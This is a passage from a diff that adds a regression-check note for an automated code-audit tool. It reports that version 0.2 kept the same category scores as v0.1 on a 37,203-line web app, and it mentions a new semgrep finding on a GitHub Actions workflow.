+dispatched as expected. No N/A bands fired (Security, Customer Flow, and
+Growth all had real surface to audit). LOC = 37,203 → parallel dispatch
+path correct (above the 1000 threshold and above the 3-module count).
+
+**Scores vs v0.1 baseline:**
+- Security:      8/10 (v0.1: 8) — unchanged
+- Architecture:  8/10 (v0.1: 8) — unchanged
+- Customer Flow: 7/10 (v0.1: 7) — unchanged
+- Growth:        9/10 (v0.1: 9) — unchanged
+
+Findings shifted slightly (semgrep now flags the GHA workflow which
+was previously not in scope; synthesis-fallback finding is the same
+half-completed-audit risk noted before), but the methodology produced
+identical category scores. This is the "v0.2 should look invisible on
+a healthy web-app" prediction holding.
+
+**Verdict:** v0.2 did not regress the working baseline. Web-app default
+path still produces R&R-quality output, all N/A bands stayed silent
+correctly, and the audit shape (stack detect → semgrep → 6 parallel
+modules → top-3) is identical to v0.1.
